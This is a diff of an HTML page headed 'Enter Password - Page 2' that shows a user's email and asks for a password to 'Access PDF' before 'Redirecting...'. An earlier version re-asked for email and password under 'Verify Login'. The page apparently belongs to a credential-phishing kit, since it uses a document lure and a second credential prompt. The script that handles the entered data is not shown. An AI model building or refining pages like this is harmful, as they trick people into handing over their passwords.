@@ -3,44 +3,36 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Verify Login - Page 2</title>
-    <link rel="stylesheet" href="css/style.css">
+    <title>Enter Password - Page 2</title>
+    <link rel="stylesheet" href="css/page2.css">
 </head>
 <body>
-    <div class="background"></div>
-
-    <div class="login-container">
-        <h1 id="pageTitle">Verify Login</h1>
-        
-        <div class="language-selector">
-            <button class="lang-btn active" data-lang="en">English</button>
-            <button class="lang-btn" data-lang="es">Español</button>
-            <button class="lang-btn" data-lang="fr">Français</button>
-            <button class="lang-btn" data-lang="zh">中文</button>
-        </div>
-        
-        <div class="success-message" id="successMessage">
-            <span id="successText">Verification successful! Opening PDF...</span>
-        </div>
-
-        <form id="verifyForm" class="form-step active">
-            <div class="form-group">
-                <label for="email2" id="emailLabel">Email Address</label>
-                <input type="email" id="email2" name="email2" autocomplete="email" required>
-                <div class="error-message" id="emailError"></div>
+    <div class="page2-container">
+        <div class="password-card">
+            <div class="card-header">
+                <h1 id="pageTitle">Enter Password</h1>
+                <p id="emailDisplay" class="email-display"></p>
             </div>
 
-            <div class="form-group">
-                <label for="password2" id="passwordLabel">Password</label>
-                <input type="password" id="password2" name="password2" autocomplete="current-password" required>
-                <div class="error-message" id="passwordError"></div>
-            </div>
+            <div class="card-content">
+                <form id="passwordForm">
+                    <div class="form-group">
+                        <label for="password" id="passwordLabel">Password</label>
+                        <input type="password" id="password" name="password" autocomplete="current-password" required>
+                        <div class="error-message" id="passwordError"></div>
+                    </div>
 
-            <button type="submit" id="verifyBtn">Access PDF</button>
-        </form>
+                    <button type="submit" id="accessBtn" class="access-btn">Access PDF</button>
+                </form>
+
+                <div class="loading-spinner" id="loadingSpinner" style="display: none;">
+                    <div class="spinner"></div>
+                    <p id="redirectText">Redirecting...</p>
+                </div>
+            </div>
+        </div>
     </div>
 
-    <script src="js/translations.js"></script>
     <script src="js/page2.js"></script>
 </body>
 </html>
